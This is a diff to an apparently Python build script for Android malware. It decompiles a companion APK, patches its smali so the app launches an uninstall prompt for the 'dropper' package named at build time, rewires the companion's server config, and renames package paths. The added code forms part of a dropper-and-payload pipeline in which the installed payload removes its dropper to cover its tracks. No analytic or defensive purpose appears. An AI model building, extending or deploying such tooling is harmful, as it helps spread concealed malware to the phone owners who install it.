@@ -808,6 +808,100 @@ def step_patch_server_config():
         print("  ⚠️  No replacements made — values may already match")
 
 
+def step_patch_dropper_pkg(nova_pkg: str):
+    """Patch uninstallTargetApps() in companion smali to target the dropper's
+    exact package name (injected at build time) instead of any hardcoded prefix.
+
+    Replaces the old loop-based startsWith("com.hexanova.system") approach
+    entirely. The new smali directly fires ACTION_DELETE for nova_pkg only.
+
+    Must run AFTER step_decompile() but BEFORE step_rename_smali() so the
+    companion smali path still uses OLD_PKG.
+    """
+    print("\n── Step 5C: Patch uninstallTargetApps → dropper pkg direct uninstall")
+
+    if not nova_pkg:
+        print("  ⚠️  NOVA_PKG env var not set — dropper uninstall will not be patched (skipped)")
+        return
+
+    old_path = OLD_PKG.replace(".", "/")
+    smali_file = os.path.join("companion_decompiled", "smali", old_path, "MainActivity.smali")
+
+    if not os.path.isfile(smali_file):
+        print(f"  ⚠️  MainActivity.smali not found at {smali_file} — skipping dropper pkg patch")
+        return
+
+    with open(smali_file, "r", encoding="utf-8") as f:
+        content = f.read()
+
+    # The new minimal uninstallTargetApps method — direct ACTION_DELETE for NOVA_PKG only.
+    # Uses 3 locals (v0=Intent, v1=Uri string, v2=parsed Uri).
+    # FLAG_ACTIVITY_NEW_TASK (0x10000000) required when calling startActivity from non-Activity context.
+    NEW_METHOD = f""".method public uninstallTargetApps(Landroid/view/View;)V
+    .locals 3
+
+    .line 1
+    :try_start_0
+    new-instance v0, Landroid/content/Intent;
+
+    .line 3
+    const-string v1, "android.intent.action.DELETE"
+
+    .line 5
+    invoke-direct {{v0, v1}}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
+
+    .line 7
+    const-string v1, "package:{nova_pkg}"
+
+    .line 9
+    invoke-static {{v1}}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
+
+    .line 11
+    move-result-object v2
+
+    .line 13
+    invoke-virtual {{v0, v2}}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;
+
+    .line 15
+    const/high16 v1, 0x1000
+
+    .line 17
+    invoke-virtual {{v0, v1}}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
+
+    .line 19
+    invoke-virtual {{p0, v0}}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
+    :try_end_0
+    .catch Ljava/lang/Exception; {{:try_start_0 .. :try_end_0}} :catch_0
+
+    .line 21
+    :catch_0
+    return-void
+.end method"""
+
+    # Locate the old method boundaries
+    METHOD_START = ".method public uninstallTargetApps(Landroid/view/View;)V"
+    METHOD_END   = ".end method"
+
+    start_idx = content.find(METHOD_START)
+    if start_idx == -1:
+        print("  ⚠️  uninstallTargetApps method not found in smali — skipping")
+        return
+
+    end_idx = content.find(METHOD_END, start_idx)
+    if end_idx == -1:
+        print("  ⚠️  uninstallTargetApps .end method not found — skipping")
+        return
+
+    end_idx += len(METHOD_END)  # include the .end method line itself
+
+    new_content = content[:start_idx] + NEW_METHOD + content[end_idx:]
+
+    with open(smali_file, "w", encoding="utf-8") as f:
+        f.write(new_content)
+
+    print(f"  ✅ uninstallTargetApps patched → direct ACTION_DELETE for dropper: {nova_pkg}")
+
+
 def step_rename_smali(new_pkg):
     print("\n── Step 6: Rename smali class paths + string literals")
     old_path = OLD_PKG.replace(".", "/")
@@ -2998,6 +3092,10 @@ def main():
 
     with track("PHASE_1", "STEP_5", "Decompile companion APK (smali only)", MOD_ASSET):
         step_decompile()
+
+    with track("PHASE_1", "STEP_5C", "Patch uninstallTargetApps → dropper pkg direct uninstall"):
+        _nova_pkg = os.environ.get("NOVA_PKG", "")
+        step_patch_dropper_pkg(_nova_pkg)
 
     with track("PHASE_1", "STEP_5B", "Patch companion server config (love.smali)"):
         step_patch_server_config()
